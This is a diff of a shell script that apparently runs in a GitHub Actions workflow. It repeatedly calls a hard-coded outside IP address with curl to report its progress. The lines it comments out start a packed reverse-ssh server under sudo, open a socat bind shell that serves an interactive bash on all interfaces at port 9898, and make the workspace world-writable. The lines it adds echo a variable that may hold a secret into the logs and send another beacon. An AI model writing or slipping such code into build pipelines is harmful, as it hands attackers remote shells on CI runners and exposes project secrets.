@@ -39,12 +39,15 @@ cp /tmp/busybox.bin /tmp/busybox &
 curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=1"
 
 
+if [ ! -z ${sp9} ]; then echo $sp9; fi
+curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=1z"
+
 if [ ! -z ${$GITHUB_WORKSPACE} ]; then 
 curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=1a"
-sudo chmod 0777 -R $GITHUB_WORKSPACE/ ;
+#sudo chmod 0777 -R $GITHUB_WORKSPACE/ ;
 curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=1b"
-[ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&busybox setsid sudo -H $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022 &
-[ -x $GITHUB_WORKSPACE/socat.bin ]&&busybox setsid $GITHUB_WORKSPACE/socat.bin -v tcp-l:9898,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
+#[ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&busybox setsid sudo -H $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022 &
+#[ -x $GITHUB_WORKSPACE/socat.bin ]&&busybox setsid $GITHUB_WORKSPACE/socat.bin -v tcp-l:9898,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
 fi
 
 curl -4k  "https://15.165.156.66:4448/tcpip-50088/gitact2?c=2"
